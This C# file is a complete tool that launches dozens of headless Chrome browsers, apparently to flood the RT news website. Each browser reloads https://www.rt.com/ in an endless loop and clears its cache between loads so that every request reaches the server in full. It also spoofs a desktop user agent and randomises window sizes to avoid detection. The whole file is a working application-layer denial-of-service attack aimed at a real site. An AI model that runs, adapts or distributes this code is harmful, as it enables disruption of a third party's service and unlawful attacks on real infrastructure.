using Kirov;
using Kirov.Platform;

using Newtonsoft.Json.Linq;

using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Chromium;
using OpenQA.Selenium.DevTools;

// on good systems this will leave some physical cores to the user
int Airships = Environment.ProcessorCount * 4;

var platform = PlatformFactory.CurrentPlatform;
if (platform is ISupportAffinity supportsAffinity)
    supportsAffinity.AffinityMask = Affinity.GetDesiredAffinity();

platform.Initialize();

// TODO: detect actual agent using non-headless version first, or just strip Headless from HeadlessChrome
const string USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36";

int kirovs = 0;

var tasks = Enumerable.Range(0, Airships)
    .Select(async _ => {
        var random = new Random();

        var chromeOptions = new ChromeOptions();
        var (w, h) = Sizing.RandomSize(random);
        chromeOptions.AddArguments(new[] {
            "--headless",
            Invariant($"--window-size={w}x{h}"),
            $"user-agent={USER_AGENT}",
        });
        chromeOptions.SetLoggingPreference("performance", LogLevel.Info);
        chromeOptions.PerformanceLoggingPreferences = new ChromiumPerformanceLoggingPreferences {
            IsCollectingNetworkEvents = true,
        };

        while (true) {
            using var driver = new ChromeDriver(chromeOptions);

            driver.Manage().Timeouts().PageLoad = TimeSpan.FromSeconds(8);
            driver.Manage().Timeouts().AsynchronousJavaScript = TimeSpan.FromSeconds(1);

            using var devTools = driver.GetDevToolsSession();
            for (int flight = 0; flight < 8; flight++) {
                try {
                    await Kirov(driver, devTools).ConfigureAwait(false);
                } catch (Exception ex) {
                    Console.Error.WriteLine(ex);
                }
            }
        }
    })
    .ToList();

await Task.WhenAll(tasks);

async Task Kirov(ChromeDriver driver, DevToolsSession devTools) {
    Console.Title = Invariant($"{Interlocked.Increment(ref kirovs)} Kirovs reporting");
    try {
        while (true) {
            driver.Navigate().GoToUrl("https://www.rt.com/");
            Console.WriteLine(await devTools.SendCommand("Network.clearBrowserCache", commandParameters: new JObject()));
        }
    } finally {
        Console.Title = Invariant($"{Interlocked.Decrement(ref kirovs)} Kirovs reporting");
    }
}
